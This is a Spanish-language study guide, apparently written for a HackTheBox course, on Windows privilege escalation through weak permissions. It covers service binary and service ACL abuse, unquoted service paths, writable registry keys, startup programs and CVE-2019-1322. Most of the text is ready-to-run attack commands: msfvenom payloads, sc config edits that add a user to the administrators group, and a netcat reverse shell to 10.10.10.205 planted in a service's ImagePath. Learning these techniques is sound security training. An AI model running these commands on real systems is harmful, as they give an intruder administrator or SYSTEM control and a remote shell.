
# Escalada de privilegios en Windows – Permisos débiles

Este documento resume las técnicas relacionadas con permisos débiles en Windows que pueden ser explotadas para obtener privilegios elevados. Se incluyen herramientas, comandos y ejemplos prácticos de explotación.

---

## 1. Permisos ACL débiles en binarios de servicios

Servicios instalados con permisos incorrectos permiten a cualquier usuario modificar sus binarios.

### Herramienta:
- [SharpUp (GhostPack)](https://github.com/GhostPack/SharpUp/)

### Ejemplo de explotación:

```powershell
PS C:\htb> .\SharpUp.exe audit
```

Salida:

```
=== Modifiable Service Binaries ===
Name        : SecurityService
PathName    : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Verificamos con `icacls`:

```cmd
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Salida:

```
Everyone:(I)(F)
BUILTIN\Users:(I)(F)
```

Sustituimos el binario por uno malicioso (reverse shell, nuevo admin, etc.) y arrancamos el servicio:

`msfvenom -p windows/exec CMD='net localgroup administrators htb-student /add' -f exe -o SecurityService.exe`

```cmd
copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

---

## 2. Permisos débiles en servicios (Service Permission Abuse)

Servicios mal configurados permiten a usuarios no privilegiados cambiar su configuración.

### Herramientas:
- [SharpUp](https://github.com/GhostPack/SharpUp/)
- [AccessChk (Sysinternals)](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)

### Ejemplo de explotación:

```cmd
accesschk.exe /accepteula -quvcw WindscribeService
```

Salida:

```
RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

Cambiamos la ruta del binario por un comando malicioso:

```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
sc stop WindscribeService
sc start WindscribeService
```

Verificamos si se añadió el usuario:

```cmd
net localgroup administrators
```

---

## 3. Rutas de servicio sin comillas (Unquoted Service Path)

Servicios que no usan comillas en la ruta de su binario permiten inyecciones si se puede escribir en directorios anteriores.

### Ejemplo de explotación:

Ruta vulnerable:

```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows buscará ejecutables como:

```
C:\Program.exe
C:\Program Files\System.exe
```

Creamos `C:\Program.exe` con payload:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o "C:\Program.exe"
```

Y reiniciamos el sistema (si no podemos reiniciar el servicio).

---

## 4. Permisos débiles en el Registro (Registry ACLs)

Algunos servicios tienen claves del registro modificables por usuarios no administradores.

### Herramienta:
- [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)

### Ejemplo de explotación:

```cmd
accesschk.exe /accepteula "usuario" -kvuqsw hklm\System\CurrentControlSet\services
```

Salida:

```
RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS
```

Modificamos `ImagePath` con PowerShell:

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

Luego arrancamos el servicio.

---

## 5. Programas en inicio automático modificables (Startup Programs)

Podemos abusar de entradas de inicio si tenemos permiso de escritura sobre la clave o el binario referenciado.

### Ejemplo:

```powershell
Get-CimInstance Win32_StartupCommand | select Name, Command, Location, User | fl
```

Si un programa apunta a una ruta donde podemos escribir, podemos sustituirlo por un payload, y el próximo inicio de sesión del usuario lanzará nuestro binario malicioso.

---

## 6. Vulnerabilidad CVE-2019-1322

Antes del parche de seguridad, era posible modificar `UsoSvc` (Windows Update Orchestrator Service), que corre como SYSTEM.

- [CVE-2019-1322 – Detalles](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322)

### Ejemplo (antes del parche):

```cmd
sc config UsoSvc binpath= "cmd /c net localgroup administrators user /add"
sc stop UsoSvc
sc start UsoSvc
```

---

## Limpieza

Para revertir cambios en servicios:

```cmd
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
sc start WindScribeService
```

---

Este resumen te permite reconocer y explotar debilidades comunes en permisos del sistema Windows relacionadas con servicios y el registro.
